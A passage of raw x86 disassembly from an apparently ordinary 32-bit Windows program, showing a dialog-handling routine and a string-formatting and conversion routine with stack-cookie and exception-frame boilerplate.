  404bf7:	33 c0                	xor    %eax,%eax
  404bf9:	5e                   	pop    %esi
  404bfa:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404bfe:	33 cc                	xor    %esp,%ecx
  404c00:	e8 7b 35 00 00       	call   0x408180
  404c05:	8b e5                	mov    %ebp,%esp
  404c07:	5d                   	pop    %ebp
  404c08:	c2 10 00             	ret    $0x10
  404c0b:	6a 00                	push   $0x0
  404c0d:	ff 15 b0 a2 40 00    	call   *0x40a2b0
  404c13:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  404c17:	5e                   	pop    %esi
  404c18:	33 cc                	xor    %esp,%ecx
  404c1a:	33 c0                	xor    %eax,%eax
  404c1c:	e8 5f 35 00 00       	call   0x408180
  404c21:	8b e5                	mov    %ebp,%esp
  404c23:	5d                   	pop    %ebp
  404c24:	c2 10 00             	ret    $0x10
  404c27:	cc                   	int3
  404c28:	cc                   	int3
  404c29:	cc                   	int3
  404c2a:	cc                   	int3
  404c2b:	cc                   	int3
  404c2c:	cc                   	int3
  404c2d:	cc                   	int3
  404c2e:	cc                   	int3
  404c2f:	cc                   	int3
  404c30:	55                   	push   %ebp
  404c31:	8b ec                	mov    %esp,%ebp
  404c33:	8b 45 0c             	mov    0xc(%ebp),%eax
  404c36:	2d 10 01 00 00       	sub    $0x110,%eax
  404c3b:	74 26                	je     0x404c63
  404c3d:	48                   	dec    %eax
  404c3e:	75 0f                	jne    0x404c4f
  404c40:	8b 45 10             	mov    0x10(%ebp),%eax
  404c43:	66 83 f8 01          	cmp    $0x1,%ax
  404c47:	74 0c                	je     0x404c55
  404c49:	66 83 f8 02          	cmp    $0x2,%ax
  404c4d:	74 06                	je     0x404c55
  404c4f:	33 c0                	xor    %eax,%eax
  404c51:	5d                   	pop    %ebp
  404c52:	c2 10 00             	ret    $0x10
  404c55:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404c58:	0f b7 c0             	movzwl %ax,%eax
  404c5b:	50                   	push   %eax
  404c5c:	51                   	push   %ecx
  404c5d:	ff 15 a8 a2 40 00    	call   *0x40a2a8
  404c63:	b8 01 00 00 00       	mov    $0x1,%eax
  404c68:	5d                   	pop    %ebp
  404c69:	c2 10 00             	ret    $0x10
  404c6c:	cc                   	int3
  404c6d:	cc                   	int3
  404c6e:	cc                   	int3
  404c6f:	cc                   	int3
  404c70:	55                   	push   %ebp
  404c71:	8b ec                	mov    %esp,%ebp
  404c73:	6a ff                	push   $0xffffffff
  404c75:	68 da 95 40 00       	push   $0x4095da
  404c7a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404c80:	50                   	push   %eax
  404c81:	81 ec cc 01 00 00    	sub    $0x1cc,%esp
  404c87:	a1 18 e0 40 00       	mov    0x40e018,%eax
  404c8c:	33 c5                	xor    %ebp,%eax
  404c8e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404c91:	53                   	push   %ebx
  404c92:	56                   	push   %esi
  404c93:	57                   	push   %edi
  404c94:	50                   	push   %eax
  404c95:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404c98:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404c9e:	68 d0 a7 40 00       	push   $0x40a7d0
  404ca3:	33 db                	xor    %ebx,%ebx
  404ca5:	89 9d 6c ff ff ff    	mov    %ebx,-0x94(%ebp)
  404cab:	8b 35 8c a1 40 00    	mov    0x40a18c,%esi
  404cb1:	68 00 04 00 00       	push   $0x400
  404cb6:	68 b8 ec 40 00       	push   $0x40ecb8
  404cbb:	ff d6                	call   *%esi
  404cbd:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404cc0:	83 c4 0c             	add    $0xc,%esp
  404cc3:	50                   	push   %eax
  404cc4:	ff 15 bc a2 40 00    	call   *0x40a2bc
  404cca:	83 c4 04             	add    $0x4,%esp
  404ccd:	50                   	push   %eax
  404cce:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404cd1:	51                   	push   %ecx
  404cd2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404cd5:	ff 15 c0 a2 40 00    	call   *0x40a2c0
  404cdb:	bf 10 00 00 00       	mov    $0x10,%edi
  404ce0:	83 c4 08             	add    $0x8,%esp
  404ce3:	39 78 14             	cmp    %edi,0x14(%eax)
  404ce6:	72 02                	jb     0x404cea
  404ce8:	8b 00                	mov    (%eax),%eax
  404cea:	3b c3                	cmp    %ebx,%eax
  404cec:	74 10                	je     0x404cfe
  404cee:	50                   	push   %eax
  404cef:	68 00 04 00 00       	push   $0x400
  404cf4:	68 b8 e8 40 00       	push   $0x40e8b8
  404cf9:	ff d6                	call   *%esi
  404cfb:	83 c4 0c             	add    $0xc,%esp
  404cfe:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  404d01:	72 0d                	jb     0x404d10
  404d03:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404d06:	52                   	push   %edx
  404d07:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  404d0d:	83 c4 04             	add    $0x4,%esp
  404d10:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404d17:	83 7d b0 08          	cmpl   $0x8,-0x50(%ebp)
  404d1b:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  404d22:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404d25:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  404d28:	72 0d                	jb     0x404d37
  404d2a:	8b 45 9c             	mov    -0x64(%ebp),%eax
  404d2d:	50                   	push   %eax
  404d2e:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  404d34:	83 c4 04             	add    $0x4,%esp
  404d37:	68 e8 a7 40 00       	push   $0x40a7e8
  404d3c:	68 00 04 00 00       	push   $0x400
  404d41:	68 b8 f0 40 00       	push   $0x40f0b8
  404d46:	ff d6                	call   *%esi
  404d48:	83 c4 0c             	add    $0xc,%esp
  404d4b:	68 fc a7 40 00       	push   $0x40a7fc
  404d50:	68 80 00 00 00       	push   $0x80
  404d55:	68 38 f5 40 00       	push   $0x40f538
  404d5a:	ff d6                	call   *%esi
  404d5c:	83 c4 0c             	add    $0xc,%esp
  404d5f:	68 04 a8 40 00       	push   $0x40a804
  404d64:	68 80 00 00 00       	push   $0x80
  404d69:	68 c4 f5 40 00       	push   $0x40f5c4
  404d6e:	ff d6                	call   *%esi
  404d70:	83 c4 0c             	add    $0xc,%esp
  404d73:	68 10 a8 40 00       	push   $0x40a810
  404d78:	68 80 00 00 00       	push   $0x80
  404d7d:	68 44 f6 40 00       	push   $0x40f644
  404d82:	ff d6                	call   *%esi
  404d84:	83 c4 0c             	add    $0xc,%esp
  404d87:	e8 54 f1 ff ff       	call   0x403ee0
  404d8c:	8d 8d 7f ff ff ff    	lea    -0x81(%ebp),%ecx
  404d92:	68 80 bb 00 00       	push   $0xbb80
  404d97:	51                   	push   %ecx
  404d98:	88 9d 7f ff ff ff    	mov    %bl,-0x81(%ebp)
  404d9e:	e8 dd f6 ff ff       	call   0x404480
  404da3:	83 c4 04             	add    $0x4,%esp
  404da6:	8b c8                	mov    %eax,%ecx
  404da8:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  404dae:	84 c0                	test   %al,%al
  404db0:	0f 84 9b 02 00 00    	je     0x405051
  404db6:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  404dbc:	c7 85 c8 fe ff ff b8 	movl   $0x40a3b8,-0x138(%ebp)
  404dc3:	a3 40 00 
  404dc6:	ff 15 dc a0 40 00    	call   *0x40a0dc
  404dcc:	53                   	push   %ebx
  404dcd:	b8 01 00 00 00       	mov    $0x1,%eax
  404dd2:	53                   	push   %ebx
  404dd3:	8d 95 cc fe ff ff    	lea    -0x134(%ebp),%edx
  404dd9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ddc:	52                   	push   %edx
  404ddd:	8d 8d c8 fe ff ff    	lea    -0x138(%ebp),%ecx
  404de3:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  404de9:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  404def:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404df6:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
  404dfc:	8b 48 04             	mov    0x4(%eax),%ecx
  404dff:	8d 95 cc fe ff ff    	lea    -0x134(%ebp),%edx
  404e05:	bf b4 a3 40 00       	mov    $0x40a3b4,%edi
  404e0a:	89 bc 0d c8 fe ff ff 	mov    %edi,-0x138(%ebp,%ecx,1)
  404e11:	8b ca                	mov    %edx,%ecx
  404e13:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  404e19:	ff 15 1c a1 40 00    	call   *0x40a11c
  404e1f:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  404e23:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  404e29:	c7 85 cc fe ff ff 74 	movl   $0x40a374,-0x134(%ebp)
  404e30:	a3 40 00 
  404e33:	ff 15 04 a1 40 00    	call   *0x40a104
  404e39:	b8 04 00 00 00       	mov    $0x4,%eax
  404e3e:	c7 85 08 ff ff ff 20 	movl   $0x20,-0xf8(%ebp)
  404e45:	00 00 00 
  404e48:	89 9d 0c ff ff ff    	mov    %ebx,-0xf4(%ebp)
  404e4e:	89 9d 10 ff ff ff    	mov    %ebx,-0xf0(%ebp)
  404e54:	89 9d 18 ff ff ff    	mov    %ebx,-0xe8(%ebp)
  404e5a:	89 9d 1c ff ff ff    	mov    %ebx,-0xe4(%ebp)
  404e60:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  404e66:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404e69:	a1 20 a1 40 00       	mov    0x40a120,%eax
  404e6e:	50                   	push   %eax
  404e6f:	51                   	push   %ecx
  404e70:	8d 8d c8 fe ff ff    	lea    -0x138(%ebp),%ecx
  404e76:	68 14 a8 40 00       	push   $0x40a814
  404e7b:	51                   	push   %ecx
  404e7c:	e8 1f c9 ff ff       	call   0x4017a0
  404e81:	83 c4 0c             	add    $0xc,%esp
  404e84:	8b c8                	mov    %eax,%ecx
  404e86:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  404e8c:	f6 85 14 ff ff ff 08 	testb  $0x8,-0xec(%ebp)
  404e93:	88 9d 7f ff ff ff    	mov    %bl,-0x81(%ebp)
  404e99:	c7 85 68 ff ff ff 80 	movl   $0xbb80,-0x98(%ebp)
  404ea0:	bb 00 00 
  404ea3:	c7 85 74 ff ff ff 27 	movl   $0x127,-0x8c(%ebp)
  404eaa:	01 00 00 
  404ead:	75 3e                	jne    0x404eed
  404eaf:	83 8d 14 ff ff ff 08 	orl    $0x8,-0xec(%ebp)
  404eb6:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
  404ebc:	8b 10                	mov    (%eax),%edx
  404ebe:	8b 8d 00 ff ff ff    	mov    -0x100(%ebp),%ecx
  404ec4:	03 11                	add    (%ecx),%edx
  404ec6:	89 95 0c ff ff ff    	mov    %edx,-0xf4(%ebp)
  404ecc:	8b 95 dc fe ff ff    	mov    -0x124(%ebp),%edx
  404ed2:	8b 0a                	mov    (%edx),%ecx
  404ed4:	8b 00                	mov    (%eax),%eax
  404ed6:	8b 95 e0 fe ff ff    	mov    -0x120(%ebp),%edx
  404edc:	8b 12                	mov    (%edx),%edx
  404ede:	51                   	push   %ecx
  404edf:	50                   	push   %eax
  404ee0:	52                   	push   %edx
  404ee1:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  404ee7:	ff 15 0c a1 40 00    	call   *0x40a10c
  404eed:	8b 85 ec fe ff ff    	mov    -0x114(%ebp),%eax
  404ef3:	8b 30                	mov    (%eax),%esi
  404ef5:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  404efb:	75 3a                	jne    0x404f37
  404efd:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  404f03:	51                   	push   %ecx
  404f04:	ff 15 14 a0 40 00    	call   *0x40a014
  404f0a:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  404f10:	74 09                	je     0x404f1b
  404f12:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  404f18:	52                   	push   %edx
  404f19:	eb 16                	jmp    0x404f31
  404f1b:	6a 01                	push   $0x1
  404f1d:	ff 15 ec a1 40 00    	call   *0x40a1ec
  404f23:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  404f28:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  404f2d:	83 c4 04             	add    $0x4,%esp
  404f30:	50                   	push   %eax
  404f31:	ff 15 1c a0 40 00    	call   *0x40a01c
  404f37:	8d 8d 7f ff ff ff    	lea    -0x81(%ebp),%ecx
  404f3d:	51                   	push   %ecx
  404f3e:	e8 3d f5 ff ff       	call   0x404480
  404f43:	83 c4 04             	add    $0x4,%esp
  404f46:	56                   	push   %esi
  404f47:	8d 95 68 ff ff ff    	lea    -0x98(%ebp),%edx
  404f4d:	52                   	push   %edx
  404f4e:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  404f54:	51                   	push   %ecx
  404f55:	68 24 a8 40 00       	push   $0x40a824
  404f5a:	8b c8                	mov    %eax,%ecx
  404f5c:	e8 3f f6 ff ff       	call   0x4045a0
  404f61:	f6 85 14 ff ff ff 08 	testb  $0x8,-0xec(%ebp)
  404f68:	74 2c                	je     0x404f96
  404f6a:	8b 95 f0 fe ff ff    	mov    -0x110(%ebp),%edx
  404f70:	83 a5 14 ff ff ff f7 	andl   $0xfffffff7,-0xec(%ebp)
  404f77:	8b 02                	mov    (%edx),%eax
  404f79:	8b 95 0c ff ff ff    	mov    -0xf4(%ebp),%edx
  404f7f:	8b 8d e0 fe ff ff    	mov    -0x120(%ebp),%ecx
  404f85:	8b 09                	mov    (%ecx),%ecx
  404f87:	52                   	push   %edx
  404f88:	50                   	push   %eax
  404f89:	51                   	push   %ecx
  404f8a:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  404f90:	ff 15 0c a1 40 00    	call   *0x40a10c
  404f96:	8b 8d c8 fe ff ff    	mov    -0x138(%ebp),%ecx
  404f9c:	8b 51 04             	mov    0x4(%ecx),%edx
  404f9f:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  404fa5:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  404fab:	89 bc 15 c8 fe ff ff 	mov    %edi,-0x138(%ebp,%edx,1)
  404fb2:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  404fb9:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  404fbf:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  404fc5:	c7 85 cc fe ff ff 74 	movl   $0x40a374,-0x134(%ebp)
  404fcc:	a3 40 00 
  404fcf:	c6 45 fc 06          	movb   $0x6,-0x4(%ebp)
  404fd3:	8b 8d 14 ff ff ff    	mov    -0xec(%ebp),%ecx
  404fd9:	80 e1 09             	and    $0x9,%cl
  404fdc:	80 f9 01             	cmp    $0x1,%cl
  404fdf:	75 29                	jne    0x40500a
  404fe1:	8b 8d 1c ff ff ff    	mov    -0xe4(%ebp),%ecx
  404fe7:	3b cb                	cmp    %ebx,%ecx
  404fe9:	74 0d                	je     0x404ff8
  404feb:	8b 95 dc fe ff ff    	mov    -0x124(%ebp),%edx
  404ff1:	8b 02                	mov    (%edx),%eax
  404ff3:	50                   	push   %eax
  404ff4:	ff d1                	call   *%ecx
  404ff6:	eb 0f                	jmp    0x405007
  404ff8:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
  404ffe:	8b 00                	mov    (%eax),%eax
  405000:	50                   	push   %eax
  405001:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  405007:	83 c4 04             	add    $0x4,%esp
  40500a:	83 a5 14 ff ff ff f6 	andl   $0xfffffff6,-0xec(%ebp)
  405011:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  405017:	89 9d 10 ff ff ff    	mov    %ebx,-0xf0(%ebp)
  40501d:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  405021:	ff 15 18 a1 40 00    	call   *0x40a118
  405027:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40502e:	8b 8d c8 fe ff ff    	mov    -0x138(%ebp),%ecx
  405034:	8b 51 04             	mov    0x4(%ecx),%edx
  405037:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  40503c:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  405042:	89 84 15 c8 fe ff ff 	mov    %eax,-0x138(%ebp,%edx,1)
  405049:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  40504f:	eb 05                	jmp    0x405056
  405051:	bf b4 a3 40 00       	mov    $0x40a3b4,%edi
  405056:	8d 8d 7f ff ff ff    	lea    -0x81(%ebp),%ecx
  40505c:	68 80 bb 00 00       	push   $0xbb80
  405061:	51                   	push   %ecx
  405062:	88 9d 7f ff ff ff    	mov    %bl,-0x81(%ebp)
  405068:	e8 13 f4 ff ff       	call   0x404480
  40506d:	83 c4 04             	add    $0x4,%esp
  405070:	8b c8                	mov    %eax,%ecx
  405072:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  405078:	84 c0                	test   %al,%al
  40507a:	0f 84 6e 05 00 00    	je     0x4055ee
  405080:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  405086:	c7 85 28 fe ff ff b8 	movl   $0x40a3b8,-0x1d8(%ebp)
  40508d:	a3 40 00 
  405090:	ff 15 dc a0 40 00    	call   *0x40a0dc
  405096:	53                   	push   %ebx
  405097:	53                   	push   %ebx
  405098:	8d 95 2c fe ff ff    	lea    -0x1d4(%ebp),%edx
  40509e:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  4050a5:	83 8d 6c ff ff ff 02 	orl    $0x2,-0x94(%ebp)
  4050ac:	52                   	push   %edx
  4050ad:	8d 8d 28 fe ff ff    	lea    -0x1d8(%ebp),%ecx
  4050b3:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  4050b9:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  4050c0:	8b 85 28 fe ff ff    	mov    -0x1d8(%ebp),%eax
  4050c6:	8b 48 04             	mov    0x4(%eax),%ecx
  4050c9:	8d 95 2c fe ff ff    	lea    -0x1d4(%ebp),%edx
  4050cf:	89 bc 0d 28 fe ff ff 	mov    %edi,-0x1d8(%ebp,%ecx,1)
  4050d6:	8b ca                	mov    %edx,%ecx
  4050d8:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  4050de:	ff 15 1c a1 40 00    	call   *0x40a11c
  4050e4:	c6 45 fc 09          	movb   $0x9,-0x4(%ebp)
  4050e8:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  4050ee:	c7 85 2c fe ff ff 74 	movl   $0x40a374,-0x1d4(%ebp)
  4050f5:	a3 40 00 
  4050f8:	ff 15 04 a1 40 00    	call   *0x40a104
  4050fe:	c7 85 68 fe ff ff 20 	movl   $0x20,-0x198(%ebp)
  405105:	00 00 00 
  405108:	89 9d 6c fe ff ff    	mov    %ebx,-0x194(%ebp)
  40510e:	89 9d 70 fe ff ff    	mov    %ebx,-0x190(%ebp)
  405114:	89 9d 78 fe ff ff    	mov    %ebx,-0x188(%ebp)
  40511a:	89 9d 7c fe ff ff    	mov    %ebx,-0x184(%ebp)
  405120:	c7 85 74 fe ff ff 04 	movl   $0x4,-0x18c(%ebp)
  405127:	00 00 00 
  40512a:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40512d:	50                   	push   %eax
  40512e:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  405135:	ff 15 c4 a2 40 00    	call   *0x40a2c4
  40513b:	83 c4 04             	add    $0x4,%esp
  40513e:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  405144:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405147:	51                   	push   %ecx
  405148:	c6 45 fc 0b          	movb   $0xb,-0x4(%ebp)
  40514c:	ff 15 c8 a2 40 00    	call   *0x40a2c8
  405152:	83 c4 04             	add    $0x4,%esp
  405155:	8b f0                	mov    %eax,%esi
  405157:	8d 95 28 fe ff ff    	lea    -0x1d8(%ebp),%edx
  40515d:	68 78 a8 40 00       	push   $0x40a878
  405162:	52                   	push   %edx
  405163:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  405167:	e8 34 c6 ff ff       	call   0x4017a0
  40516c:	83 c4 08             	add    $0x8,%esp
  40516f:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  405175:	c7 45 cc 0f 00 00 00 	movl   $0xf,-0x34(%ebp)
  40517c:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40517f:	88 5d b8             	mov    %bl,-0x48(%ebp)
  405182:	c6 45 fc 0d          	movb   $0xd,-0x4(%ebp)
  405186:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40518a:	8b 7e 10             	mov    0x10(%esi),%edi
  40518d:	72 0a                	jb     0x405199
  40518f:	8b 06                	mov    (%esi),%eax
  405191:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
  405197:	eb 06                	jmp    0x40519f
  405199:	89 b5 74 ff ff ff    	mov    %esi,-0x8c(%ebp)
  40519f:	39 9d 74 ff ff ff    	cmp    %ebx,-0x8c(%ebp)
  4051a5:	0f 84 99 00 00 00    	je     0x405244
  4051ab:	8d 04 7f             	lea    (%edi,%edi,2),%eax
  4051ae:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  4051b2:	50                   	push   %eax
  4051b3:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  4051b9:	e8 ba 2e 00 00       	call   0x408078
  4051be:	8b 8d 6c ff ff ff    	mov    -0x94(%ebp),%ecx
  4051c4:	83 c4 04             	add    $0x4,%esp
  4051c7:	51                   	push   %ecx
  4051c8:	8b f0                	mov    %eax,%esi
  4051ca:	53                   	push   %ebx
  4051cb:	56                   	push   %esi
  4051cc:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  4051d2:	e8 61 39 00 00       	call   0x408b38
  4051d7:	83 c4 0c             	add    $0xc,%esp
  4051da:	3b f3                	cmp    %ebx,%esi
  4051dc:	74 2f                	je     0x40520d
  4051de:	8b 95 6c ff ff ff    	mov    -0x94(%ebp),%edx
  4051e4:	52                   	push   %edx
  4051e5:	53                   	push   %ebx
  4051e6:	56                   	push   %esi
  4051e7:	e8 4c 39 00 00       	call   0x408b38
  4051ec:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  4051f2:	8b 8d 74 ff ff ff    	mov    -0x8c(%ebp),%ecx
  4051f8:	83 c4 0c             	add    $0xc,%esp
  4051fb:	53                   	push   %ebx
  4051fc:	53                   	push   %ebx
  4051fd:	50                   	push   %eax
  4051fe:	56                   	push   %esi
  4051ff:	57                   	push   %edi
  405200:	51                   	push   %ecx
  405201:	68 00 02 00 00       	push   $0x200
  405206:	53                   	push   %ebx
  405207:	ff 15 40 a0 40 00    	call   *0x40a040
  40520d:	8b c6                	mov    %esi,%eax
  40520f:	8d 50 01             	lea    0x1(%eax),%edx
  405212:	8a 08                	mov    (%eax),%cl
  405214:	40                   	inc    %eax
  405215:	3a cb                	cmp    %bl,%cl
  405217:	75 f9                	jne    0x405212
  405219:	2b c2                	sub    %edx,%eax
  40521b:	8b f8                	mov    %eax,%edi
  40521d:	8b c6                	mov    %esi,%eax
  40521f:	8d 75 b8             	lea    -0x48(%ebp),%esi
  405222:	e8 59 1e 00 00       	call   0x407080
  405227:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40522d:	3b c3                	cmp    %ebx,%eax
  40522f:	74 0a                	je     0x40523b
  405231:	50                   	push   %eax
  405232:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  405238:	83 c4 04             	add    $0x4,%esp
  40523b:	83 7d cc 10          	cmpl   $0x10,-0x34(%ebp)
  40523f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  405242:	73 03                	jae    0x405247
  405244:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405247:	8b 95 68 ff ff ff    	mov    -0x98(%ebp),%edx
  40524d:	50                   	push   %eax
  40524e:	52                   	push   %edx
  40524f:	e8 4c c5 ff ff       	call   0x4017a0
  405254:	83 c4 08             	add    $0x8,%esp
  405257:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  40525b:	83 7d cc 10          	cmpl   $0x10,-0x34(%ebp)
  40525f:	72 0d                	jb     0x40526e
  405261:	8b 45 b8             	mov    -0x48(%ebp),%eax
  405264:	50                   	push   %eax
  405265:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40526b:	83 c4 04             	add    $0x4,%esp
  40526e:	8b 8d 68 ff ff ff    	mov    -0x98(%ebp),%ecx
  405274:	68 68 a8 40 00       	push   $0x40a868
  405279:	bf 0f 00 00 00       	mov    $0xf,%edi
  40527e:	51                   	push   %ecx
  40527f:	89 7d cc             	mov    %edi,-0x34(%ebp)
  405282:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405285:	88 5d b8             	mov    %bl,-0x48(%ebp)
  405288:	e8 13 c5 ff ff       	call   0x4017a0
  40528d:	83 c4 08             	add    $0x8,%esp
  405290:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  405296:	89 7d e8             	mov    %edi,-0x18(%ebp)
  405299:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  40529c:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  40529f:	c6 45 fc 0e          	movb   $0xe,-0x4(%ebp)
  4052a3:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  4052a9:	83 78 14 08          	cmpl   $0x8,0x14(%eax)
  4052ad:	8b 48 10             	mov    0x10(%eax),%ecx
  4052b0:	89 8d 78 ff ff ff    	mov    %ecx,-0x88(%ebp)
  4052b6:	72 0a                	jb     0x4052c2
  4052b8:	8b 10                	mov    (%eax),%edx
  4052ba:	89 95 74 ff ff ff    	mov    %edx,-0x8c(%ebp)
  4052c0:	eb 06                	jmp    0x4052c8
  4052c2:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
  4052c8:	39 9d 74 ff ff ff    	cmp    %ebx,-0x8c(%ebp)
  4052ce:	0f 84 93 00 00 00    	je     0x405367
  4052d4:	8d 3c 49             	lea    (%ecx,%ecx,2),%edi
  4052d7:	8d 7c 3f 01          	lea    0x1(%edi,%edi,1),%edi
  4052db:	57                   	push   %edi
  4052dc:	e8 97 2d 00 00       	call   0x408078
  4052e1:	83 c4 04             	add    $0x4,%esp
  4052e4:	57                   	push   %edi
  4052e5:	8b f0                	mov    %eax,%esi
  4052e7:	53                   	push   %ebx
  4052e8:	56                   	push   %esi
  4052e9:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  4052ef:	e8 44 38 00 00       	call   0x408b38
  4052f4:	83 c4 0c             	add    $0xc,%esp
  4052f7:	3b f3                	cmp    %ebx,%esi
  4052f9:	74 29                	je     0x405324
  4052fb:	57                   	push   %edi
  4052fc:	53                   	push   %ebx
  4052fd:	56                   	push   %esi
  4052fe:	e8 35 38 00 00       	call   0x408b38
  405303:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  405309:	8b 8d 74 ff ff ff    	mov    -0x8c(%ebp),%ecx
  40530f:	83 c4 0c             	add    $0xc,%esp
  405312:	53                   	push   %ebx
  405313:	53                   	push   %ebx
  405314:	57                   	push   %edi
  405315:	56                   	push   %esi
  405316:	50                   	push   %eax
  405317:	51                   	push   %ecx
  405318:	68 00 02 00 00       	push   $0x200
  40531d:	53                   	push   %ebx
  40531e:	ff 15 40 a0 40 00    	call   *0x40a040
  405324:	8b c6                	mov    %esi,%eax
  405326:	8d 50 01             	lea    0x1(%eax),%edx
  405329:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  405330:	8a 08                	mov    (%eax),%cl
  405332:	40                   	inc    %eax
  405333:	3a cb                	cmp    %bl,%cl
  405335:	75 f9                	jne    0x405330
  405337:	2b c2                	sub    %edx,%eax
  405339:	8b f8                	mov    %eax,%edi
  40533b:	8b c6                	mov    %esi,%eax
  40533d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  405340:	e8 3b 1d 00 00       	call   0x407080
  405345:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40534b:	3b c3                	cmp    %ebx,%eax
  40534d:	74 0a                	je     0x405359
  40534f:	50                   	push   %eax
  405350:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  405356:	83 c4 04             	add    $0x4,%esp
  405359:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  40535d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405360:	bf 0f 00 00 00       	mov    $0xf,%edi
  405365:	73 03                	jae    0x40536a
  405367:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40536a:	8b b5 68 ff ff ff    	mov    -0x98(%ebp),%esi
  405370:	50                   	push   %eax
  405371:	56                   	push   %esi
  405372:	e8 29 c4 ff ff       	call   0x4017a0
  405377:	83 c4 08             	add    $0x8,%esp
  40537a:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  40537e:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  405382:	72 0d                	jb     0x405391
  405384:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  405387:	52                   	push   %edx
  405388:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40538e:	83 c4 04             	add    $0x4,%esp
